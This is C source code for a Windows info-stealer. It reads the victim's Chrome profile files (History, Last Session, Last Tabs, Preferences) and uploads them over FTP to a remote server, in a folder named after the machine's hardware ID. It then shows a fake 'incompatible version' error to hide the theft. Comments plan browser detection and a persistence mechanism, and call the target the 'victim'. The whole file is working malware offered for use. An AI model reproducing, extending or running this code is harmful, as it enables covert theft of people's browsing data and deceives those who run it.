#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include <tchar.h>
/*
 todo
 1. determine what browser victim has through if & else statements, if SetCurrentDir returns 0, try other browser directories 
 2. implement persistence mechanism that will execute the program every so often (or implement sleep mechanism in here & copy file to diff
 directory - this method would be resource intensive)
 3. if implemented to stay persistent, implement way to check if directory in ftp server already exists & if it does simply change into it & drop the needed files
*/
int main() {
  char *user = getenv("USERPROFILE");
  char *files[4] = {"History", "Last Session", "Last Tabs", "Preferences"};
  char uuid[50];
  int returnVal;
  WIN32_FIND_DATA location;
  HINTERNET connection;
  HINTERNET ftp;
  HW_PROFILE_INFO info;
  strcat(user, "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\");
  SetCurrentDirectory(user);
  GetCurrentHwProfile(&info);
  strcpy(uuid, info.szHwProfileGuid);
  connection = InternetOpenA("winapi", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  ftp = InternetConnectA(connection, "192.168.1.207", INTERNET_DEFAULT_FTP_PORT, "ftpuser", "ftpuser", INTERNET_SERVICE_FTP, 0, 0);
  returnVal = FtpSetCurrentDirectoryA(ftp, uuid);
  if (returnVal == 0) {
    FtpCreateDirectoryA(ftp, uuid);
    FtpSetCurrentDirectoryA(ftp, uuid);
  }
  else {
    printf("Attempting to launch program...");
  }
  for (int i = 0; i <= 3; i++) {
    FindFirstFileA(files[i], &location);
    FtpPutFileA(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0);


}
  MessageBox(0, "The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program, and then contact the software publisher.", "Error", MB_OK);
}
